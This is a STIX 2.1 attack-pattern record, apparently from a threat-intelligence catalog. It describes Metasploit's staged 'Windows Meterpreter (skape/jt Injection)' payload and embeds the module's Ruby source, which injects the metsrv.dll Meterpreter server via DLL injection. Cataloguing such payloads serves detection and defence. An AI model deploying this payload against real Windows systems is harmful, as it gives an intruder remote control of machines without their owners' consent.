{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b3d32d5-5d1f-4d35-94d4-e08af7f3cd6e",
    "created": "2024-08-14T16:33:19.254507Z",
    "modified": "2024-08-14T16:33:19.254511Z",
    "name": "Windows Meterpreter (skape/jt Injection)",
    "description": "Inject the meterpreter server DLL (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/windows/patchupmeterpreter.rb",
            "external_id": "patchupmeterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# Injects the meterpreter server instance DLL via the DLL injection payload.\n#\n###\nmodule MetasploitModule\n\n  include Msf::Payload::Windows::DllInject\n  include Msf::Sessions::MeterpreterOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Windows Meterpreter (skape/jt Injection)',\n      'Description'   => 'Inject the meterpreter server DLL (staged)',\n      'Author'        => 'skape',\n      'License'       => MSF_LICENSE,\n      'Session'       => Msf::Sessions::Meterpreter_x86_Win))\n\n    # Don't let people set the library name option\n    options.remove_option('LibraryName')\n    options.remove_option('DLL')\n  end\n\n  #\n  # The library name that we're injecting the DLL as has to be metsrv.dll for\n  # extensions to make use of.\n  #\n  def library_name\n    \"metsrv.dll\"\n  end\n\n  def library_path\n    MetasploitPayloads.meterpreter_path('metsrv','x86.dll')\n  end\nend\n"
}